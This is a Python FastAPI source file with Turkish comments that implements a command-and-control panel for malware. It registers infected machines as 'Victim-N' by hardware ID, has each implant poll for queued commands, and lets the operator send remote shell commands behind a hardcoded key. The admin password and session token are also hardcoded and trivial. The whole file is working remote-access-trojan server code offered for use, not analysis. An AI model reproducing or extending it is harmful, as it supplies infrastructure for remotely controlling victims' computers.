from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel
import time
import hashlib
from typing import Dict, List

app = FastAPI()

# --- GÜVENLİK AYARLARI ---
PANEL_PASSWORD = "admin" # Panel giriş şifresi
SHELL_KEY = "1234"      # Shell çalıştırmak için gereken özel anahtar

# Veri Yapıları
clients: Dict[str, dict] = {} 
commands: Dict[str, str] = {}
hwid_to_id: Dict[str, int] = {} # HWID -> Victim ID (1, 2, 3...)
next_id = 1

class LoginRequest(BaseModel):
    password: str

@app.get("/", response_class=HTMLResponse)
async def get_dashboard():
    with open("index.html", "r", encoding="utf-8") as f:
        return f.read()

@app.post("/api/login")
async def login(req: LoginRequest):
    if req.password == PANEL_PASSWORD:
        return {"status": "ok", "token": "secret-session-token-123"}
    raise HTTPException(status_code=401, detail="Hatalı şifre")

@app.get("/api/clients")
async def get_clients():
    now = time.time()
    clean_clients = []
    for hwid, data in clients.items():
        status = "online" if now - data["last_seen"] < 60 else "offline"
        clean_clients.append({
            "id": f"Victim-{hwid_to_id[hwid]}",
            "hwid_hidden": "***" + hwid[-6:], # HWID'in sadece sonunu göster
            "os": data["os"],
            "status": status,
            "last_seen_str": time.strftime('%H:%M:%S', time.localtime(data["last_seen"]))
        })
    return clean_clients

@app.get("/poll/{hwid}")
async def poll(hwid: str, os: str = "Unknown"):
    global next_id
    if hwid not in hwid_to_id:
        hwid_to_id[hwid] = next_id
        next_id += 1
        
    clients[hwid] = {
        "os": os,
        "last_seen": time.time()
    }
    
    cmd = commands.get(hwid, "WAIT")
    if cmd != "WAIT":
        del commands[hwid]
    return {"command": cmd}

@app.post("/api/command/{hwid_id}/{cmd}")
async def set_command(hwid_id: str, cmd: str, key: str = ""):
    # HWID_ID burada "Victim-1" formatında gelecek, onu geri çözmemiz lazım
    target_hwid = None
    target_num = int(hwid_id.replace("Victim-", ""))
    for h, i in hwid_to_id.items():
        if i == target_num:
            target_hwid = h
            break
            
    if not target_hwid:
        raise HTTPException(status_code=404, detail="Cihaz bulunamadı")

    # Shell komutu için özel key kontrolü
    if cmd.startswith("SHELL:"):
        if key != SHELL_KEY:
            raise HTTPException(status_code=403, detail="Geçersiz Shell Anahtarı!")

    commands[target_hwid] = cmd
    return {"status": "ok"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
